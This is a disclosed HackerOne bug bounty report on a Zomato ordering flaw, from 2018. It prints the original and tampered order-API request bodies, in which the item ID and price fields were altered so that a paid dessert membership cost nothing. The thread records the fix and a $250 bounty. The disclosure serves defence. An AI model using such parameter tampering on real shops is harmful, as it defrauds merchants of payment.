{"id":321938,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjE5Mzg=","url":"https://hackerone.com/reports/321938","title":"[www.zomato.com] Getting a complimentary dessert [Zomato Treats] on ordering a Meal at no cost","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-03-05T04:54:29.802Z","submitted_at":"2018-03-05T04:54:29.802Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"harsh13","url":"/harsh13","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2943,"url":"https://hackerone.com/zomato","handle":"zomato","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Zomato","twitter_handle":"Zomato","website":"https://www.zomato.com","about":"The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-04-25T12:26:28.033Z","bug_reporter_agreed_on_going_public_at":"2018-04-24T13:23:20.728Z","team_member_agreed_on_going_public_at":"2018-04-25T12:26:27.955Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"1. Go to order food tab and select any restaurant that delivers online.\n2. Add Zomato Treat Subscription to cart.\n3. Add more items to cart to fulfil the minimum order requirement for that restaurant.\n4. Click on Continue and proceed to pay online.\n5. While paying online I faced the issue that \"some items in your cart have been changed\" and was unable to pay. If you face the same issue toggle between Card Payment and Netbanking 1-2 times and then pay via Netbanking.\n\nThe final api for order is:\n\nPOST https://www.zomato.com/php/o2_handler.php\n\nHost: www.zomato.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.zomato.com/\ncontent-type: application/x-www-form-urlencoded;charset=UTF-8\norigin: https://www.zomato.com\nContent-Length: 3277\nCookie:  YOUR COOKIES HERE\nConnection: close\n\ncase=makeonlineorder\u0026res_id=██████\u0026order=███\n\ntotal_cost%22%3A%22254.32%22%2C%22type%22%3A%22total%22%2C%22unit_cost%22%3A0%2C%22quantity%22%3A0%2C%22comment%22%3Anull%2C%22groups%22%3A%5B%5D%2C%22item_id%22%3A0%2C%22mrp_item%22%3A0%2C%22tax_inclusive%22%3A0%2C%22tags%22%3A%22%22%2C%22tax_id%22%3A0%2C%22id%22%3A0%2C%22\n\ndisplay_cost%22%3A%22%E2%82%B9254.32%22%7D%5D%2C%22dishes%22%3A%5B%7B%22type%22%3A%22dish%22%2C%22comment%22%3A%22%22%2C%22groups%22%3A%5B%5D%2C%22item_id%22%3A390080785%2C%22item_name%22%3A%22Poha%22%2C%22mrp_item%22%3A0%2C%22quantity%22%3A2%2C%22tags%22%3A%221%22%2C%22tax_inclusive%22%3A0%2C%22unit_cost%22%3A59%2C%22total_cost%22%3A118%2C%22is_bogo_active%22%3Afalse%2C%22bogoItemsCount%22%3A0%2C%22alwaysShowOnCheckout%22%3A0%2C%22duration_id%22%3A0%7D%2C%7B%22type%22%3A%22plan%22%2C%22comment%22%3A%22%22%2C%22groups%22%3A%5B%5D%2C%22\n\nitem_id%22%3A3%2C%22item_name%22%3A%22Zomato%20Treats%20Membership%22%2C%22mrp_item%22%3A1%2C%22quantity%22%3A1%2C%22tags%22%3A%221%22%2C%22tax_inclusive%22%3A0%2C%22unit_cost%22%3A149%2C%22total_cost%22%3A149%2C%22\n\nis_bogo_active%22%3Afalse%2C%22bogoItemsCount%22%3A0%2C%22alwaysShowOnCheckout%22%3A1%2C%22duration_id%22%3A4%7D%2C%7B%22type%22%3A%22treat_dish%22%2C%22comment%22%3A%22%22%2C%22groups%22%3A%5B%5D%2C%22item_id%22%3A407847609%2C%22item_name%22%3A%22Banana%20Cake%20-%20Treats%22%2C%22mrp_item%22%3A0%2C%22quantity%22%3A1%2C%22tags%22%3A%2220%2C24%22%2C%22tax_inclusive%22%3A0%2C%22unit_cost%22%3A60%2C%22total_cost%22%3A60%2C%22is_bogo_active%22%3Afalse%2C%22bogoItemsCount%22%3A0%2C%22alwaysShowOnCheckout%22%3A1%2C%22duration_id%22%3A0%7D%5D%7D\u0026address_id=██████\u0026phone=█████\u0026phone_country_id=1\u0026name=Russel\u0026special_instructions=\u0026user_forced=0\u0026verify_phone=0\u0026payment_method_id=██████████\u0026payment_method_type=netbanking\u0026card_token=0\u0026card_name=\u0026card_bin=\u0026card_vault=winecellar\u0026recharge=0\u0026recharge_amount=0\u0026recharge_method_type=\u0026additional_recharge=0\u0026additional_recharge_amount=0\u0026voucher_code=\u0026wallet_type=self\u0026dob=\u0026csrfToken=db465772ce05763ac9082da5ec8cef1b\u0026csrft_creation_time=1520220575093\n\n\n6. The item id on the separate line is the id corresponding to Zomato Treats with a price of Rs.149. On trying more item_ids, I figured out that there are more order ids for Zomato Treats, and have a price of 0.\n\n7. I changed the item_id to 18, the unit_cost to 0, and subtracted 149(Zomato Treats Cost) from the total cost. Initial total cost: 254, final total cost: 105.\n\n8. So ,the new payload becomes:\n\ncase=makeonlineorder\u0026res_id=█████\u0026order=██████\n\n###TOTAL COST CHANGED to 105\ntotal_cost%22%3A%22105.32%22%2C%22type%22%3A%22total%22%2C%22unit_cost%22%3A0%2C%22quantity%22%3A0%2C%22comment%22%3Anull%2C%22groups%22%3A%5B%5D%2C%22item_id%22%3A0%2C%22mrp_item%22%3A0%2C%22tax_inclusive%22%3A0%2C%22tags%22%3A%22%22%2C%22tax_id%22%3A0%2C%22id%22%3A0%2C%22\n\ndisplay_cost%22%3A%22%E2%82%B9254.32%22%7D%5D%2C%22dishes%22%3A%5B%7B%22type%22%3A%22dish%22%2C%22comment%22%3A%22%22%2C%22groups%22%3A%5B%5D%2C%22item_id%22%3A390080785%2C%22item_name%22%3A%22Poha%22%2C%22mrp_item%22%3A0%2C%22quantity%22%3A2%2C%22tags%22%3A%221%22%2C%22tax_inclusive%22%3A0%2C%22unit_cost%22%3A59%2C%22total_cost%22%3A118%2C%22is_bogo_active%22%3Afalse%2C%22bogoItemsCount%22%3A0%2C%22alwaysShowOnCheckout%22%3A0%2C%22duration_id%22%3A0%7D%2C%7B%22type%22%3A%22plan%22%2C%22comment%22%3A%22%22%2C%22groups%22%3A%5B%5D%2C%22\n\n### ITEM Id changed to 18 and total and unit cost changed to 0\nitem_id%22%3A18%2C%22item_name%22%3A%22Zomato%20Treats%20Membership%22%2C%22mrp_item%22%3A1%2C%22quantity%22%3A1%2C%22tags%22%3A%221%22%2C%22tax_inclusive%22%3A0%2C%22\nunit_cost%22%3A0%2C%22total_cost%22%3A0%2C%22\n\nis_bogo_active%22%3Afalse%2C%22bogoItemsCount%22%3A0%2C%22alwaysShowOnCheckout%22%3A1%2C%22duration_id%22%3A4%7D%2C%7B%22type%22%3A%22treat_dish%22%2C%22comment%22%3A%22%22%2C%22groups%22%3A%5B%5D%2C%22item_id%22%3A407847609%2C%22item_name%22%3A%22Banana%20Cake%20-%20Treats%22%2C%22mrp_item%22%3A0%2C%22quantity%22%3A1%2C%22tags%22%3A%2220%2C24%22%2C%22tax_inclusive%22%3A0%2C%22unit_cost%22%3A60%2C%22total_cost%22%3A60%2C%22is_bogo_active%22%3Afalse%2C%22bogoItemsCount%22%3A0%2C%22alwaysShowOnCheckout%22%3A1%2C%22duration_id%22%3A0%7D%5D%7D\u0026address_id=█████████\u0026phone=██████████\u0026phone_country_id=1\u0026name=Russel\u0026special_instructions=\u0026user_forced=0\u0026verify_phone=0\u0026payment_method_id=████\u0026payment_method_type=netbanking\u0026card_token=0\u0026card_name=\u0026card_bin=\u0026card_vault=winecellar\u0026recharge=0\u0026recharge_amount=0\u0026recharge_method_type=\u0026additional_recharge=0\u0026additional_recharge_amount=0\u0026voucher_code=\u0026wallet_type=self\u0026dob=\u0026csrfToken=db465772ce05763ac9082da5ec8cef1b\u0026csrft_creation_time=1520220575093\n\n9. Complete the transaction and your order will be placed.\n\n10. PFA the screenshot of the order that shows free banana treats. \n\n11. Using this I was not subscribed to Zomato Treats Subscription, but still can get free treats.\n\n## Impact\n\nAnyone can order free treats from Zomato.","bounty_amount":"250.0","formatted_bounty":"$250","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-05-24T13:23:20.794Z","allow_singular_disclosure_after":-106795323.9622678,"singular_disclosure_allowed":true,"vote_count":6,"voters":["gerben_javado","eveeez","japz","sumit7","harsh13","alexoooo"],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":383,"asset_type":"URL","asset_identifier":"*.zomato.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2465651,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@harsh13 \n\nThanks for your submission. We will review it and get back to you.\n\nBest Regards. ","automated_response":false,"created_at":"2018-03-06T23:31:36.779Z","updated_at":"2018-03-06T23:31:36.779Z","actor":{"username":"glassofbeer","cleared":false,"url":"/glassofbeer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/166/997/bf60ed9bb749786ae3f68f25703bf0528699cda7_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2465978,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"PFA the video POC:\n1. The item_id is changed from 3 to 18.\n2. The zomato treats subscription cost is changed from 149 to 0.\n3. 149 is then subtracted from the total cost to adjust the total cost.\n4. The response shows that the payment is initiated successfully.\n5. I then completed the payment of Rs27 via netbanking and was able to get free treats.","automated_response":false,"created_at":"2018-03-07T02:58:55.922Z","updated_at":"2018-03-07T02:58:55.922Z","actor":{"username":"harsh13","cleared":false,"url":"/harsh13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2469089,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2018-03-07T11:29:23.668Z","updated_at":"2018-03-07T11:29:23.668Z","actor":{"username":"chicken-tikka","cleared":false,"url":"/chicken-tikka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/568/cdbb30fd8932f00a06868a737ab5bdc5c57e5f00_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"harsh13","url":"/harsh13"},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2472232,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-03-08T06:38:14.120Z","updated_at":"2018-03-08T06:38:14.120Z","actor":{"url":"/zomato","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Zomato"}},"bounty_amount":"250.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"zomato","collaborator":{"username":"harsh13","url":"/harsh13"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2480409,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Verified the fix. █████████\nThanks for the bounty.","automated_response":false,"created_at":"2018-03-11T05:23:21.115Z","updated_at":"2018-04-25T11:58:52.114Z","actor":{"username":"harsh13","cleared":false,"url":"/harsh13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2659772,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-04-24T13:23:20.757Z","updated_at":"2018-04-24T13:23:20.757Z","first_to_agree":true,"actor":{"username":"harsh13","cleared":false,"url":"/harsh13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2663782,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2018-04-25T12:17:05.451Z","updated_at":"2018-04-25T12:17:05.451Z","additional_data":{"old_title":"Order Zomato Treats for free","new_title":"[www.zomato.com] Getting a complimentary dessert [Zomato Treats] on ordering a Meal at no cost"},"actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2663783,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-04-25T12:17:34.425Z","updated_at":"2018-04-25T12:17:34.425Z","additional_data":{"old_severity":"High","new_severity":"Medium","old_severity_id":124888,"new_severity_id":145240},"actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2663919,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-04-25T12:26:27.983Z","updated_at":"2018-04-25T12:26:27.983Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2663920,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-04-25T12:26:28.061Z","updated_at":"2018-04-25T12:26:28.061Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}